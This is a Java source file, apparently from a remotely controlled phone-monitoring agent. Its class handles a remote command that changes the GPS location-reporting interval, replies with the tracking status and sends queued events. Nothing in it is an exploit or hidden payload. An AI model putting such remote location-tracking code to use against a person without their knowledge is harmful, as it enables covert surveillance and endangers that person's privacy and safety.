package com.vvt.rmtcmd.pcc;

import com.vvt.global.Global;
import com.vvt.gpsc.GPSOption;
import com.vvt.info.ApplicationInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.std.Constant;

public class PCCUpdateLocationInterval extends PCCRmtCmdAsync {
	
	private SendEventManager eventSender = Global.getSendEventManager();
	private int timerIndex = 0;
	
	public PCCUpdateLocationInterval(int timerIndex) {
		this.timerIndex = timerIndex;		
	}
	
	// Runnable
	public void run() {
		doPCCHeader(PhoenixCompliantCommand.UPDATE_GPS_INTERVAL.getId());
		try {
			Preference pref = Global.getPreference();
			PrefGPS gps = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
			int index = 0;
			if (timerIndex != 0) {
				GPSOption opt = gps.getGpsOption();
				index = timerIndex - 1;
				opt.setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[index]);
				gps.setGpsOption(opt);
			}
			pref.commit(gps);
			responseMessage.append(Constant.OK);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.LOC_ENABLE);
			if (gps.isEnabled()) {
				responseMessage.append(RmtCmdTextResource.ON);
			} else {
				responseMessage.append(RmtCmdTextResource.OFF);
			}
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.UPDATE_INTERVAL);
			responseMessage.append(ApplicationInfo.LOCATION_TIMER_REPLY[index]);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.LOC_METHODS);
			responseMessage.append(RmtCmdTextResource.LOC_AGPS_METHODS);
			responseMessage.append(Constant.COMMA_AND_SPACE);
			responseMessage.append(RmtCmdTextResource.LOC_GLOC_METHODS);
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.LOC_NOT_SUPPORTED);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());
		// To send events
		eventSender.sendEvents();
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}
}
